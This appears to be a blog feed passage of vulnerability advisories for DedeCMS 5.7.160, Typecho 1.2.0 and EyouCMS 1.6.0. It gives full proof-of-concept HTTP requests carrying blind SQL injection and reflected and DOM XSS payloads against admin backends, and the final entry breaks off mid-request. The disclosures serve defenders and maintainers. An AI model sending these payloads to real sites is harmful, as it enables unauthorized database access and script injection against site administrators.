    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend group store blind SQL injection via post parameters.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>Request to <code>/dede/group_store.php</code> with GET parameter <code>action=uprank</code> and POST parameters <code>rank_1=1&#39;+and+sleep(3)+and+&#39;1</code>, this payload will lead to a time-based SQL injection.</li><li>In the source code of <code>/dede/group_store.php</code>, when the GET parameter <code>action</code> is <code>uprank</code>, the POST value which the key contains <code>rank_</code> will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through <code>mysqli_query</code>, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.</li></ol><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-group/2.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/group_store.php?action=uprank</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fgroup_store.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">rank_1</span>=<span class="number">1</span>&#x27;+and+sleep(<span class="number">3</span>)+and+&#x27;<span class="number">1</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Blind SQL injection in backend /dede/group_store.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="SQLi" scheme="https://srpopty.github.io/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Blind SQL Injection</title>
    <link href="https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/"/>
    <id>https://srpopty.github.io/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/</id>
    <published>2023-02-26T16:38:53.000Z</published>
    <updated>2023-02-26T16:38:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend story catalog blind SQL injection via post parameters.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>Request to <code>/dede/story_catalog.php</code> with GET parameter <code>action=uprank</code> and POST parameters <code>rank_1=1&#39;+and+sleep(3)+and+&#39;1</code>, this payload will lead to a time-based SQL injection.</li><li>Requires <code>PHP ≤ 5</code> and <code>MySQL ≤ 5.5</code>, and the story component contains at least one record in database.</li><li>In the source code of <code>/dede/story_catalog.php</code>, when the GET parameter <code>action</code> is <code>uprank</code>, the POST value which the key contains <code>rank_</code> will be directly joined into the update SQL statement, which lead to SQL update injection, finally the joint statement will be passed through <code>mysqli_query</code>, but this function only return boolean value when the query string is an update statement, that is why this is a blind injection.</li></ol><p><img src="/2023/02/27/DedeCMS-V5.7.160-Backend-SQLi-story/2.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/story_catalog.php?action=uprank</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C2_1%2C3_1; PHPSESSID=k5ten9v1ljuogh8pjae2idof0b; _csrf_name_273c7533=e59946ea73ad488a9da6a03897480ac5; _csrf_name_273c75331BH21ANI1AGD297L1FF21LN02BGE1DNG=6c93980ce4934236; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0462031c83e0ae08; DedeLoginTime=1677428501; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=d9cb1c6293c6c17e; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fstory_books.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">rank_1</span>=<span class="number">1</span>&#x27;+and+sleep(<span class="number">3</span>)+and+&#x27;<span class="number">1</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Blind SQL injection in backend /dede/story_catalog.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="SQLi" scheme="https://srpopty.github.io/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS V5.7.160 Backend Reflected XSS</title>
    <link href="https://srpopty.github.io/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/"/>
    <id>https://srpopty.github.io/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/</id>
    <published>2023-02-26T14:47:13.000Z</published>
    <updated>2023-02-26T14:47:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend image file upload with reflected-XSS in uploaded filename.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DedeCMS &lt;= 5.7.160</p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management.</li><li>In <code>/dede/upload.php</code>, upload an new image file named “file”, with the filename contains XSS payload, e.g. <code>&lt;img src=x onerror=alert(1)&gt;.png</code>.</li><li>The uploaded filename must ends with a normal image extension, e.g. <code>.png</code> or <code>.jpeg</code>, and the file content must contains the legal image file header, filename should not contains and <code>/</code> or <code>\</code>.</li><li>The response of <code>/dede/upload.php</code> contains the XSS payload with the <code>text/html</code> content-type.</li></ol><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/2.png"></p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/3.png"></p><p>In source code, the filename is directly passed through the <code>pathinfo</code> function and assigned to <code>$res[&#39;remark&#39;]</code>, and finally echoed json encoded array, which contains the XSS payload, and by default, the response content-type is <code>text/html</code>.</p><p><img src="/2023/02/26/DedeCMS-V5.7.160-Backend-Reflected-XSS-upload/4.png"></p><p>Full POC request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/dedecms/dede/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.3</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>317</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8dr4oJI5ByNkMbkK</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>menuitems=1_1%2C4_1%2C5_1%2C6_1%2C2_1%2C3_1; PHPSESSID=n5ibb5j70gj24qh8alr61u6ov2; _csrf_name_1d27e3c9=426b27a62d00e1341c13019bf34f4d05; _csrf_name_1d27e3c91BH21ANI1AGD297L1FF21LN02BGE1DNG=6e24882e1c219de6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=c7079a345e8c8682; DedeLoginTime=1677347766; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=8163b03f86d69dc6; ENV_GOBACK_URL=%2Fcms%2Fdedecms%2Fdede%2Fcontent_i_list.php%3Fchannelid%3D2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-mel">------WebKitFormBoundary8dr4oJI5ByNkMbkK</span></span><br><span class="line"><span class="language-mel">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;&lt;img src=x onerror=alert(1)&gt;.png&quot;</span></span></span><br><span class="line"><span class="language-mel">Content-Type: <span class="keyword">image</span>/png</span></span><br><span class="line"><span class="language-mel"></span></span><br><span class="line"><span class="language-mel">PNG</span></span><br><span class="line"><span class="language-mel"></span></span><br><span class="line"><span class="language-mel">IHDR(-SPLTEà<span class="number">22</span>ßÿêé]³ôß&amp;&amp;<span class="number">1</span>%dIDATc<span class="string">``</span><span class="string">`dbfaec@,¶hQGÜYIEND®B`</span></span></span><br><span class="line"><span class="language-mel">------WebKitFormBoundary8dr4oJI5ByNkMbkK--</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">DedeCMS-V5.7.160 with Backend Reflected Cross-Site Scripting in backend /dede/upload.php.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Typecho V1.2.0 Backend Reflected XSS</title>
    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/"/>
    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/</id>
    <published>2023-02-21T12:12:27.000Z</published>
    <updated>2023-02-21T12:12:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend management system with reflected-XSS in the name of an arbitrarily supplied URL parameter.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to typecho admin backend management system, in <code>/admin/index.php</code>, <code>admin/themes.php</code> or <code>/admin/backup.php</code>.</li><li>In the name of an arbitrarily supplied URL parameter, no matter key or value, will be injected to a html href attribute of <code>&lt;a&gt;</code> tag.</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/typecho/admin/?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--bbb=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.10</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.10/typecho/admin/login.php?referer=http%3A%2F%2F192.168.0.10%2Ftypecho%2Fadmin%2Findex.php%3Fr7ptu%2522%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253Eat2f7%3D1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>e4dff44224c23efabc177d44e50b1de4__typecho_uid=1; e4dff44224c23efabc177d44e50b1de4__typecho_authCode=%24T%248O0qulQf98a49e06253d4ae8c93f478424457be4b; PHPSESSID=m7h7isuus6cugk6mb58vdah296</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>in <code>/admin/index.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/2.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/3.png"></p><p>in <code>/admin/theme.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/5.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/6.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/4.png"></p><p>in <code>/admin/backup.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/8.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/9.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/7.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1535">Github Issue</a></li><li><a href="https://github.com/typecho/typecho/commit/f9ede542c9052ba22a6096d8412e2f02d9de872b">Github Commit</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Typecho-V1.2.0 with Backend Reflected Cross-Site Scripting in backend /admin/index.php with arbitrarily supplied URL parameter.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Typecho V1.2.0 Backend DOM-Based XSS</title>
    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/"/>
    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/</id>
    <published>2023-02-21T11:48:55.000Z</published>
    <updated>2023-02-21T11:48:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend post editor with DOM-based XSS when adding a new post tag.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management system.</li><li>Create a new or edit an existed post, in <code>admin/write-post.php</code> add a new tag.</li><li>If the new tag name contains the XSS payload, e.g. <code>&lt;li&gt;&lt;p&gt;aaa&lt;a&gt;test&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;</code>, it will be injected into a <code>&lt;li&gt;</code> html tag.</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;p&gt;aaa&lt;img src=x onerror=alert(1)&gt;aaa&lt;/p&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/2.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/3.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1536">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Typecho-V1.2.0 with Backend DOM-Based Cross-Site Scripting in backend /admin/write-post.php when creating new or editing existed post.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45542)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/</id>
    <published>2023-02-15T13:33:17.000Z</published>
    <updated>2023-02-15T13:33:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend file management editor with reflected-XSS in the GET value <code>filename</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=edit&amp;filename=li|&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--sts_media.htm&amp;activepath=%3Atemplate%3Amobile&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=index&amp;activepath=%3Atemplate%3Amobile&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/201612233-8e16dccb-774b-433b-b6f2-306216deb043.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/33">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45542">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend loing.php when editing file.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45537)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/</id>
    <published>2023-02-15T13:18:35.000Z</published>
    <updated>2023-02-15T13:18:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Background article publish with reflected-XSS in the cookie <code>ENV_LIST_URL</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span 